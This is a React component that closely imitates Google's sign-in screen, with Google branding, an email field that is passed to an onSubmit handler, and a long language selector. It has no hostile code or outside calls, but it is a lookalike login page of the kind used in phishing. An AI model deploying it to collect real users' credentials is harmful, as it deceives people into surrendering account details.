// GoogleSignUpForm.jsx
import React, { useState } from 'react';
import socialLogo from './googlepage/social.png';
import './GooglePopup.css';

const GoogleSignUpForm = ({ onSubmit }) => {
  const [email, setEmail] = useState('');


  const handleSubmit = (e) => {
    e.preventDefault();
    if (email.trim()) {
      onSubmit(email);
    }
  };

  return (
    <div className="main_container">
      <div className="inner_container">
        <img src={socialLogo} alt="Google logo" id="inner_logo" />
        <div className="inner_head">
          <span id="sign">Sign in</span>
          <span id="use">Use your Google Account</span>
        </div>


        <div className="email_input">
          <form className="emailForm" onSubmit={handleSubmit}>
            <input
                type="text"
                name="email"
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
            />
            <button className="forgot-btn" type="button">Forgot email?</button>
          </form>
        </div>


        <div className="learnmore">
          Not your computer? Use Guest mode to sign in privately.<br></br>
          <a href="">Learn more about using Guest mode</a>
          <div className="buttonS">
            <div>
              <button id="Create" type="button">Create account</button>
            </div>
            <div>
              <button id="next" type="submit" onClick={handleSubmit}>Next</button>
            </div>
          </div>
        </div>


      </div>

      <div className="inner_footer">
        <div>
          <select name="language_bar" id="language" defaultValue="English (United States)">
            <option value="Afrikaans">Afrikaans</option>
            <option value="azərbaycan">azərbaycan</option>
            <option value="bosanski">bosanski</option>
            <option value=" català"> català</option>
            <option value=" Čeština"> Čeština</option>
            <option value=" Cymraeg"> Cymraeg</option>
            <option value=" Dansk"> Dansk</option>
            <option value="Deutsch">Deutsch</option>
            <option value=" eesti"> eesti</option>
            <option value="  Español (España)"> Español (España)</option>
            <option value="English (United States)">English (United States)</option>
            <option value="  English (United Kingdom)"> English (United Kingdom)</option>
            <option value=" Español (Latinoamérica)"> Español (Latinoamérica)</option>
            <option value="  euskara"> euskara</option>
            <option value="  Filipino"> Filipino</option>
            <option value="Français (Canada)">Français (Canada)</option>
            <option value=" Français (France)"> Français (France)</option>
            <option value="Gaeilge">Gaeilge</option>
            <option value="galego">galego</option>
            <option value=" Hrvatski"> Hrvatski</option>
            <option value="Indonesia">Indonesia</option>
            <option value="isiZulu">isiZulu</option>
            <option value=" íslenska"> íslenska</option>
            <option value="Italiano"> Italiano</option>
            <option value="Kiswahili">Kiswahili</option>
            <option value="latviešu">latviešu</option>
            <option value=" lietuvių"> lietuvių</option>
            <option value=" magyar"> magyar</option>
            <option value="  Melayu"> Melayu</option>
            <option value="   Nederlands"> Nederlands</option>
            <option value="norsk">norsk</option>
            <option value="o‘zbek">o‘zbek</option>
            <option value="  polski"> polski</option>
            <option value=" Português (Brasil)"> Português (Brasil)</option>
            <option value=" Português (Portugal)"> Português (Portugal)</option>
            <option value="română">română</option>
            <option value=" shqip"> shqip</option>
            <option value="Slovenčina">Slovenčina</option>
            <option value="    slovenščina"> slovenščina</option>
            <option value="  srki (latinica)ps"> srki (latinica)ps</option>
            <option value="Suomi">Suomi</option>
            <option value=" Svenska"> Svenska</option>
            <option value="  Tiếng Việt"> Tiếng Việt</option>
            <option value="Türkçe">Türkçe</option>
            <option value="Ελληνικά">Ελληνικά</option>
            <option value="беларуская">беларуская</option>
            <option value=" български"> български</option>
            <option value="кыргызча">кыргызча</option>
            <option value="  қазақ тілі"> қазақ тілі</option>
            <option value=" македонски"> македонски</option>
            <option value="монгол">монгол</option>
            <option value="Русский">Русский</option>
            <option value="српски (ћирилица)">српски (ћирилица)</option>
            <option value=" Українська"> Українська</option>
            <option value=" ქართული"> ქართული</option>
            <option value=" հայերեն"> հայերեն</option>
            <option value="‫עברית">‫עברית</option>
            <option value="‫اردو">‫اردو</option>
            <option value="‫العربية‬‎">‫العربية‬‎</option>
            <option value="‫فارسی‬‎">‫فارسی‬‎</option>
            <option value=" አማርኛ"> አማርኛ</option>
            <option value=" नेपाली"> नेपाली</option>
            <option value=" मराठी"> मराठी</option>
            <option value=" हिन्दी"> हिन्दी</option>
            <option value=" অসমীয়া"> অসমীয়া</option>
            <option value=" বাংলা"> বাংলা</option>
            <option value="ਪੰਜਾਬੀ">ਪੰਜਾਬੀ</option>
            <option value=" ગુજરાતી"> ગુજરાતી</option>
            <option value=" ଓଡ଼ିଆ"> ଓଡ଼ିଆ</option>
            <option value=" தமிழ்"> தமிழ்</option>
            <option value="తెలుగు">తెలుగు</option>
            <option value="ಕನ್ನಡ">ಕನ್ನಡ</option>
            <option value="  മലയാളം"> മലയാളം</option>
            <option value="සිංහල">සිංහල</option>
            <option value="ไทย">ไทย</option>
            <option value="ລາວ">ລາວ</option>
            <option value="မြန်မာ">မြန်မာ</option>
            <option value="ខ្មែរ">ខ្មែរ</option>
            <option value="한국어">한국어</option>
            <option value="中文（香港）">中文（香港）</option>
            <option value=" 日本語"> 日本語</option>
            <option value="简体中文">简体中文</option>
            <option value="繁體中文">繁體中文</option>
          </select>
        </div>

        <div id="footer_links">
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
      </div>
    </div>
  );
};


export default GoogleSignUpForm;
